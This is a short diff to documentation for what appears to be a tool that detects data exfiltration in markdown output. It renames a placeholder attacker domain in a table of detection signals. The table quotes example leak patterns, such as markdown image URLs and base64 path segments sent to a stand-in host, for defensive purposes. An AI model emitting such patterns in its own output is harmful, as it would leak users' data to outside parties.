@@ -103,9 +103,9 @@ Detection signals:
 
 | Signal | Example |
 |--------|---------|
-| Markdown image with external URL | `![img](https://evil.com/leak?data=secret)` |
+| Markdown image with external URL | `![img](https://evil.example/leak?data=secret)` |
 | Data URI | `![](data:text/plain;base64,c2VjcmV0)` |
-| Base64 segment in URL path | `https://evil.com/exfil/c2VjcmV0Cg==` |
+| Base64 segment in URL path | `https://evil.example/exfil/c2VjcmV0Cg==` |
 | Long query parameter (>200 bytes) | Encoded data appended to query string |
 
 Domain whitelisting and blacklisting with three match modes (`exact`, `suffix`, `glob`) allow fine-tuning.
